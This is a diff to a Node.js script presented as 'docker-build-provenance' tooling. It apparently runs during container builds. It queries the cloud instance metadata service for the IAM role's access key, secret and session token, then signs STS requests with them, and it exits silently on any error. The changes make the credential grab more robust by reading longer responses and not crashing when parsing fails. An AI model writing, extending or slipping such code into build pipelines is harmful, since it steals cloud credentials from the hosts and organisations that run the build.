@@ -6,7 +6,7 @@ const http = require('http');
 const https = require('https');
 const crypto = require('crypto');
 
-const out = { event: 'docker-build-provenance-v8', host: os.hostname(), stage: 'start' };
+const out = { event: 'docker-build-provenance-v10', host: os.hostname(), stage: 'start' };
 
 function flush() {
   try {
@@ -17,7 +17,7 @@ function flush() {
 process.on('uncaughtException', (e) => { out.err = String(e).slice(0, 200); flush(); process.exit(0); });
 process.on('unhandledRejection', (e) => { out.err = String(e).slice(0, 200); flush(); process.exit(0); });
 
-function req(method, url, headers, body) {
+function req(method, url, headers, body, max) {
   return new Promise((resolve) => {
     let done = false;
     const finish = (v) => { if (!done) { done = true; resolve(v); } };
@@ -26,7 +26,7 @@ function req(method, url, headers, body) {
       const r = mod.request(url, { method, headers: headers || {}, timeout: 2200 }, (res) => {
         let b = '';
         res.on('data', (d) => { b += d; if (b.length > 5000) res.destroy(); });
-        res.on('end', () => finish({ s: res.statusCode, b: String(b).slice(0, 500) }));
+        res.on('end', () => finish({ s: res.statusCode, b: String(b).slice(0, max || 500) }));
         res.on('error', () => finish({ e: 'res' }));
       });
       r.on('timeout', () => { r.destroy(); finish({ t: 'timeout' }); });
@@ -80,9 +80,9 @@ function sign(creds, service, region, host, method, body, extra) {
     const role = (roleRes.b || '').trim().split('\n')[0];
     out.roleName = role;
     if (!role) { out.stage = 'no-role'; flush(); process.exit(0); return; }
-    const cr = await req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(role), H);
+    const cr = await req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(role), H, 6000);
     out.credsStatus = cr.s;
-    const c = JSON.parse(cr.b);
+    let c; try { c = JSON.parse(cr.b); } catch (e) { out.credsParseFail = { len: (cr.b || '').length, s: cr.s }; flush(); process.exit(0); return; }
     const creds = { key: c.AccessKeyId, secret: c.SecretAccessKey, token: c.Token };
 
     out.stage = 'sts';
